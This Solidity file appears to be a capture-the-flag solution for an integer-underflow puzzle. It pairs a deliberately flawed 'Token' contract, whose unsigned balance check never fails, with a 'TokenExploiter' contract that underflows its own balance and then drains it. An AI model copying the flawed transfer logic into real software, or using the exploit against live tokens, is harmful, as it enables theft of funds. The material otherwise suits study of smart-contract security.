// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TokenExploiter {
    Token internal exploitee;
    constructor(address addr) public {
        exploitee = Token(addr);
    }
    
    
    function exploit(address _to) public {
        exploitee.transfer(_to, 1);
        exploitee.transfer(_to, 1);
        exploitee.transfer(_to, 1);
        exploitee.transfer(_to, 1);
        exploitee.transfer(_to, 1);
    }
    function transferAll(address _to) public returns (bool) {
        return exploitee.transfer(_to, exploitee.balanceOf(address(this)));
    }
}

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}